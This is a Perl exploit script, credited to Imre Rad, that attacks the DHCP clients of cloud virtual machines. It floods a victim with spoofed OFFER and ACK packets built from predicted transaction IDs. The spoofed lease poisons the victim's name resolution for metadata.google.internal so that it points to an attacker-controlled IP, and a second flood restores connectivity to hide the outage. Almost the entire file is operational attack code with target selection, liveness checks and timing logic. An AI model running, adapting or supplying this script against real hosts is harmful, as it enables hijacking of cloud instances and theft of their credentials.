#!/usr/bin/perl

# dhcp low entropy exploit by Imre Rad

use strict;
use warnings;
use Net::Ping;
use FindBin qw($Bin);

my $mode = shift @ARGV;
my $victim_ip = shift @ARGV;
my $meta_ip = shift @ARGV;
my $min_ts = shift @ARGV;
my $max_ts = shift @ARGV;
die "Usage: $0 offer|ack|simple victim-ip-address meta-ip-address min_ts max_ts\n" if((!$max_ts)||($mode !~ /^(ack|offer|simple)$/));

# flushing stdout immediately
$| = 1;

my $ack_poison_sec = $ENV{ACK_POISON_SEC} || 1801;
my $nic = $ENV{NIC} || "ens4";
my $min_pid = $ENV{MIN_PID} || 290;
my $max_pid = $ENV{MAX_PID} || 315;


my $my_ip = $ENV{MY_IP} || run('ip addr show dev %s | awk \'/inet / {print $2}\' | cut -d/ -f1', $nic);
my $my_router = $ENV{MY_ROUTER} || run('ip route show default | awk \'/via/ {print $3}\'');
my $victim_final_ip = $ENV{FINAL_IP} || $victim_ip;
my $dst_mac = $ENV{MAC} || guess_mac($victim_final_ip);

# according to `getconf ARG_MAX` we have got 2mbyte for command line args, 86400*9 is still only ~700kbyte
# still, env/cmdline was too limited to pass a day of xids
my $xidtmp = "/tmp/xids.txt";
my $d = $ENV{XIDS} || runrandr();

print "NIC: $nic\n";
print "Min pid: $min_pid\n";
print "Max pid: $max_pid\n";
print "Min ts: $min_ts\n";
print "Max ts: $max_ts\n";
print "Attacker IP: $my_ip\n";
print "Router: $my_router\n";
print "Target IP (initial phase): $victim_ip\n";
print "Target MAC: $dst_mac\n";
print "Target IP (final phase): $victim_final_ip\n";

my $dhcp_poison_params = "-lease 15 -dev $nic -dstip $victim_ip -newhost metadata.google.internal -newip $meta_ip -srcip $my_ip -mac $dst_mac -xidfile $xidtmp";
my $dhcp_restore_params = "-ack -lease 1800 -dev $nic -dstip $victim_ip -newip $victim_final_ip -route $my_router -srcip $my_ip -mac $dst_mac -xidfile $xidtmp";

if($mode eq "offer") {

   # we flood with an offer and an ack first
   print("Initial OFFER+ACK flood\n");
   my $short_flood_pid = run_background(13, "$Bin/flood -offer -ack $dhcp_poison_params");

   # the lease is 15 seconds
   sleep(14);

   # the lease set up in the previous round is expiring at this point. we restore the network connectivity at this point.

   print "Flooding again to revert the original network config\n";
   run_timeout(20, "$Bin/flood $dhcp_restore_params");
} elsif($mode eq "simple") {
  # this is a simple flood just to demonstrate that we can take over the network (by abusing the router ip on the same subnet
  # packets meant for the metadata server would be routed to us)

  run_timeout($ack_poison_sec, "$Bin/flood $dhcp_restore_params");

} elsif($mode eq "ack") {
  # lets ensure first the host is up
  my $p = Net::Ping->new("icmp", $ENV{PING_TIMEOUT} || 0.3);
  if(!$p->ping($victim_ip)) {
     die "$victim_ip is not alive\n";
  }
  print "$victim_ip is alive\n";

  # sending ACKs with poisoned hostname for one long lease round (1800 sec)
  print "Start flooding the victim for $ack_poison_sec sec\n";
  my $flood_pid = run_background($ack_poison_sec, "$Bin/flood -ack $dhcp_poison_params");

  print "And monitoring it in the background\n";
  # now lets monitor if it goes down
  my $before = time();
  while(1) {
    if((!$p->ping($victim_ip))&&(!$p->ping($victim_ip))) {
       last;
    }
    my $now = time();
    if($now - $before > $ack_poison_sec) {
       die "$victim_ip didnt went down, XID was probably incorrect.";
    }
  }
  $p->close();


  print("The host is down, it probably swallowed the poison ivy!\n");

  # we lost it, so probably the first flood succeeded
  kill("TERM", $flood_pid);

  # the lease is 15 seconds
  sleep(14);

  print("And now some flood again to revert connectivity\n");
  run_background(12, "$Bin/flood -ack $dhcp_restore_params");
}


sub guess_mac {
  my $ip = shift;
  # google seems to use the pattern 42:01:[ipv4addr]
  my @digits = split(/\./, $ip);
  my $re = "42:01";
  for my $d (@digits) {
    $re.= sprintf(":%02x", $d);
  }
  return $re;
}

sub run {
  my $cmd_pattern = shift;
  my $cmd = sprintf($cmd_pattern, @_);
  print "RUN: $cmd\n";
  my $re = `$cmd`;
  $re =~ s/\s*$//;
  return $re;
}

sub mysystem {
  my $cmd = shift;
  print "RUN: $cmd\n";
  return system($cmd);
}

# executes cmd in the background and returns the pid
sub run_background {
  my $duration_sec = shift;
  my $cmd = shift;
  my $pid = fork;
  if ($pid == 0) {
    print "Running for $duration_sec sec in the background: $cmd\n";
    exec("timeout $duration_sec $cmd");
    exit;
  }
  return $pid;
}

sub run_timeout {
  my $duration_sec = shift;
  my $cmd = shift;
  print "Running for $duration_sec sec: $cmd\n";
  return system("timeout $duration_sec $cmd");
}

sub runrandr {
  my $cmd = "$Bin/randr $victim_final_ip $min_pid $max_pid $min_ts $max_ts 2>/dev/null | paste -sd ',' - >$xidtmp";
  print "RUN: $cmd\n";
  return `$cmd`;
}
